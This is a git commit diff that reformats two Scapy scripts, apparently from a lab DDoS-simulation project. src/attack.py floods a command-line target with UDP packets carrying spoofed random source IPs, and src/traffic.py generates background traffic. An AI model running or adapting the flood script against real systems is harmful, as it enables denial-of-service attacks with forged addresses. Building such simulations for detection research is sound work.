76726d64052b134d88a652ae1ed27aebf6273f1d
joe019 <joeantony019@gmail.com>
2018-03-31 15:32:30 +0530

    minor edits

--- src/attack.py
+++ src/attack.py
@@ -8,12 +8,12 @@ from random import randrange
 import time
 
 def generateSourceIP():
-    not_valid = [10,127,254,255,1,2,169,172,192]
+    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]
 
-    first = randrange(1,256)
+    first = randrange(1, 256)
 
     while first in not_valid:
-        first = randrange(1,256)
+        first = randrange(1, 256)
         #print first
 
     ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
@@ -22,24 +22,23 @@ def generateSourceIP():
 
 
 def main():
-    for i in range (1,5):
+    for i in range (1, 5):
         launchAttack()
         time.sleep (10)
 
 def launchAttack():
-  #eg, python attack.py 10.0.0.64
-  #destinationIP = 10.0.0.64
+  #eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
   destinationIP = sys.argv[1:]
   #print destinationIP
 
   interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
 
-  for i in xrange(0,500):
-    packets = Ether() / IP( dst = destinationIP, src = generateSourceIP() ) / UDP( dport = 1, sport = 80 )
-    print( repr(packets) )
+  for i in xrange(0, 500):
+    packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / UDP(dport = 1, sport = 80)
+    print(repr(packets))
 
     #send packets with interval = 0.025 s
-    sendp( packets, iface = interface.rstrip(), inter = 0.025 )
+    sendp(packets, iface = interface.rstrip(), inter = 0.025)
 
 if __name__=="__main__":
   main()
--- src/traffic.py
+++ src/traffic.py
@@ -9,36 +9,36 @@ from random import randrange
 
 def generateSourceIP():
     #not valid for first octet of IP address
-    not_valid = [10,127,254,1,2,169,172,192]
+    not_valid = [10, 127, 254, 1, 2, 169, 172, 192]
 
     #selects a random number in the range [1,256)
-    first = randrange(1,256)
+    first = randrange(1, 256)
 
     while first in not_valid:
-        first = randrange(1,256)
+        first = randrange(1, 256)
     
     #eg, ip = "100.200.10.1"
-    ip = ".".join([str(first),str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
+    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
 
     return ip
 
-#start, end: given as command line arguments. eg, python traffic.py –s 2 –e 65   
+#start, end: given as command line arguments. eg, python traffic.py -s 2 -e 65  
 def generateDestinationIP(start, end):
     first = 10
     second = 0; 
     third = 0;
 
     #eg, ip = "10.0.0.64"
-    ip = ".".join([str(first),str(second),str(third),str(randrange(start,end))])
+    ip = ".".join([str(first), str(second), str(third), str(randrange(start,end))])
 
     return ip
 
 def main(argv):
-    print argv
+    #print argv
     
     #getopt.getopt() parses command line arguments and options 
     try:
-        opts, args = getopt.getopt(sys.argv[1:],'s:e:', ['start=','end='])
+        opts, args = getopt.getopt(sys.argv[1:], 's:e:', ['start=','end='])
     except getopt.GetoptError:
         sys.exit(2)
 
@@ -57,11 +57,11 @@ def main(argv):
     interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
 
     for i in xrange(1000):
-        packets = Ether() / IP( dst = generateDestinationIP (start, end), src = generateSourceIP () ) / UDP( dport = 80, sport = 2 )
-        print( repr(packets) )
+        packets = Ether() / IP(dst = generateDestinationIP (start, end), src = generateSourceIP ()) / UDP(dport = 80, sport = 2)
+        print(repr(packets))
 
-	#rstrip() strips whitespace characters from the end of interface
-        sendp( packets, iface = interface.rstrip(), inter = 0.1 )
+	    #rstrip() strips whitespace characters from the end of interface
+        sendp(packets, iface = interface.rstrip(), inter = 0.1)
 
 if __name__ == '__main__':
   main(sys.argv)
